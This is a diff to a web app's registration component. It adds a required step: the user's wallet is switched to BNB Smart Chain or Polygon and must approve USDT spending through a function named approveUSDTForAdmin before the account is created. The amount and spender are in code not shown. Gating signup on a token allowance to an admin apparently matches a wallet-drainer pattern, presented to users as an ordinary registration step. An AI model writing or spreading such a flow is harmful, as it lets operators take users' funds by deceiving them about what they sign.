@@ -64,6 +64,67 @@ function RegisterContent() {
     }
     setLoading(true);
     try {
+      // Step 1: Get USDT approval for the selected network
+      const { ethers } = await import('ethers');
+      const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../lib/web3');
+      
+      const injectedProvider = window.ethereum;
+      if (!injectedProvider) {
+        toast.error('Wallet not detected. Please reconnect.');
+        setLoading(false);
+        return;
+      }
+
+      const web3Provider = new ethers.BrowserProvider(injectedProvider);
+      const userAddress = ethers.getAddress(address.toLowerCase());
+
+      // Switch to the selected network
+      const targetChainId = form.network === 'BSC' ? '0x38' : '0x89';
+      const targetChainName = form.network === 'BSC' ? 'BNB Smart Chain' : 'Polygon';
+      try {
+        await web3Provider.send('wallet_switchEthereumChain', [{ chainId: targetChainId }]);
+      } catch (switchErr) {
+        if (switchErr.code === 4902) {
+          const chainConfig = form.network === 'BSC'
+            ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
+            : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
+          await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
+        } else if (switchErr.code === 4001) {
+          toast.error(`Please switch to ${targetChainName} to continue.`);
+          setLoading(false);
+          return;
+        }
+      }
+
+      // Re-get provider after network switch
+      const freshProvider = new ethers.BrowserProvider(injectedProvider);
+
+      // Check if already approved on this network
+      const alreadyApproved = await checkUSDTAllowance(userAddress, form.network);
+      if (!alreadyApproved) {
+        toast.loading(`Approving USDT on ${targetChainName}...`, { id: 'approve' });
+        try {
+          await approveUSDTForAdmin(freshProvider, form.network);
+          toast.success('USDT approved!', { id: 'approve' });
+        } catch (approveErr) {
+          toast.dismiss('approve');
+          if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
+            toast.error('USDT approval is required to register. Please approve.');
+            setLoading(false);
+            return;
+          }
+          if (approveErr.message?.includes('insufficient funds')) {
+            toast.error(`Insufficient ${form.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee.`);
+            setLoading(false);
+            return;
+          }
+          toast.error(`Approval failed: ${approveErr.shortMessage || approveErr.message || 'Try again'}`);
+          setLoading(false);
+          return;
+        }
+      }
+
+      // Step 2: Register on backend
       const res = await authAPI.register(form);
       setEmail(form.email);
       toast.success(res.data.message);
